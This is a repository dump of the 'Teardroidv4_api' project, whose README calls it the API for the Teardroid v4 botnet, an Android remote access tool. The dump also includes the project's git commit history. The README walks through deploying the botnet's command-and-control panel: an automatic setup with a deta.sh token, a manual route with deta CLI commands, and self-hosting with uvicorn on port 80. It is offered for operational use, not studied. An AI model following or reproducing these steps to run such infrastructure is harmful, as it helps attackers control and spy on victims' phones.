@@ -1,0 +1,213 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+# Teardroidv4_api
+Teardroid v4 Botnet API
+
+This api is for teardroid v4 botnet
+
+Please visit https://github.com/ScRiPt1337/Teardroid-phprat to know about teardroid and how to use it
+
+### Deploy the Teardroid control panel ( automatically ) ( recommend )
+
+- Set up an account at [deta.sh](https://web.deta.sh/)
+- Login into your account and go to settings ( [settings ](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/deta_dash.png) | [create access token ](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/token2.png) )
+- click on create access token and copy the access token
+- run python3 setup.py
+- it will ask you for the access token paste the access token.
+- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/20507b2c-0668-4b21-913b-aeab369f0229.gif)
+- Done and here is your control panel url.
+- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/control_url.png)
+
+### Deploy the Teardroid control panel ( Manually )
+
+- Set up an account at [deta.sh](https://web.deta.sh/)
+- Install [Deta Cli](https://docs.deta.sh/docs/cli/install)
+- Logging in to Deta via the CLI
+- Create a new Python Micro using the command below
+
+```bash
+$ deta new --python teardroid_control # its will create an teardroid_control folder
+```
+
+- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below
+
+```bash
+$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
+```
+
+- Move all Teardroidv4_api Files to teardroid_control folder using the command below
+
+```bash
+$ cd Teardroidv4_api
+$ cp -r * ../teardroid_control/
+```
+
+- Go back to the deta repo folder using the command below
+
+```bash
+$ cd ../teardroid_control/
+```
+
+- Deploy the Control panel using the following command.
+
+```bash
+$ deta deploy
+```
+
+### Run control panel on your own server
+
+- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below
+
+```bash
+$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
+```
+
+- Install uvicorn
+
+```bash
+$ sudo apt-get install uvicorn
+$ python3 -m pip install uvicorn
+```
+
+- Change dir to Teardroidv4_api
+
+```bash
+$ cd Teardroidv4_api
+```
+
+- Install all dependency
+
+```bash
+$ pip install -r requirements.txt
+```
+
+- Change project key to connect with database
+- Set up an account at [deta.sh](https://web.deta.sh/) and go to project keys and create a new key and copy it
+```bash
+$ nano ./db/database.py
+from deta import Deta
+from os import getenv
+
+deta = Deta(getenv("DETA_PROJECT_KEY")) => deta =  Deta("demo project key")
+# replace getenv("DETA_PROJECT_KEY") with your deta.sh project key
+# make sure your remove getenv
+```
+
+- Run teardroid api
+
+```bash
+$ screen
+# press enter to go inside the screen session
+$ uvicorn main:app --host 0.0.0.0 --port 80
+# now close your terminal windows  and we are good to go
+```
+
+- Done
+====================== GIT HISTORY: ======================
+ab94f54 HEAD@{0}: clone: from https://github.com/ScRiPt1337/Teardroidv4_api
+commit ab94f549a1c96591663de0eb06d7252ca1ad74d6
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Sun Dec 18 00:17:08 2022 +0530
+
+    Update README.md
+
+commit 48afcf21a3de66b27718aac433e1cb315c6f55bf
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Sun Dec 18 00:11:03 2022 +0530
+
+    Update README.md
+
+commit 111655ed17e0f558b60cf0a7244b35abb221a1de
+Merge: 022e824 5b68cf9
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Tue Nov 22 00:42:47 2022 +0530
+
+    Merge pull request #1 from krisdowis/patch-1
+    
+    Update README.md
+
+commit 5b68cf9c692bf9e8a28b665c835ab5010401b164
+Author: Praise Christopher <81590267+krisdowis@users.noreply.github.com>
+Date:   Mon Nov 21 19:03:15 2022 +0100
+
+    Update README.md
+    
+    add instructions on how to host on localhost
+
+commit 022e8244a77e971514a7bc6b9fd02d3620f4476f
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Fri Nov 11 18:42:26 2022 +0530
+
+    updating title
+
+commit 8a131c28f8edf8cb923bec0db49a1d7b9fb9d6d7
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Tue Jul 12 14:25:45 2022 +0530
+
+    Update README.md
+
+commit d6b422647599f9c34d54403762cddf0ff2c0302b
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Fri Jan 28 05:07:09 2022 +0530
+
+    Login issue fix
+
+commit 7607663af9744e0e4c0d80d523e28c5ce51e9e1f
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Fri Jan 28 04:57:07 2022 +0530
+
+    Update auth.py
+
+commit 0dfcf6ed6f714343056ea6e5506ea11336eb560d
+Author: script <anon42237@gmail.com>
+Date:   Fri Jan 28 04:53:48 2022 +0530
+
+    update auth.py
+
+commit e2e571b69c38973f8d6e073c25e168c70c86dc6c
+Author: script <anon42237@gmail.com>
+Date:   Fri Jan 28 04:46:24 2022 +0530
+
+    fix httpexception import statement
+
+commit 1ffc92f76ab9be9b40c94a232c6114711a3ac9f3
+Author: script <anon42237@gmail.com>
+Date:   Fri Jan 28 04:37:21 2022 +0530
+
+    fix login page
+
+commit f7428c07d97d3cf212a29e47ccadedbb1e1d6e79
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Fri Jan 28 04:17:13 2022 +0530
+
+    Update auth.py
+
+commit 4678b49ff3717d4e18a193f661eb73c6e1fb419f
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Fri Jan 28 00:08:42 2022 +0530
+
+    Update README.md
+
+commit ee255798e0e153a29abdd7d5692e7e1f9c22f440
+Author: script <anon42237@gmail.com>
+Date:   Fri Jan 28 00:08:50 2022 +0530
+
+    updating readme.md
+
+commit 98e3fd17cc4853a5342a8d90632973e2474afb7b
+Author: script <anon42237@gmail.com>
+Date:   Fri Jan 28 00:08:26 2022 +0530
+
+    updating readme.md
+
+commit 985cd18d1ea5e89de8767fd38c3b73b135c40de3
+Author: script <anon42237@gmail.com>
+Date:   Fri Jan 28 00:04:34 2022 +0530
+
+    Adding new api files
+
+commit 8c17288ece2167f9561947306b8d5acc7ec28774
+Author: ScRiPt1337 <anon42237@gmail.com>
+Date:   Thu Jan 27 23:34:54 2022 +0530
+
+    Initial commit
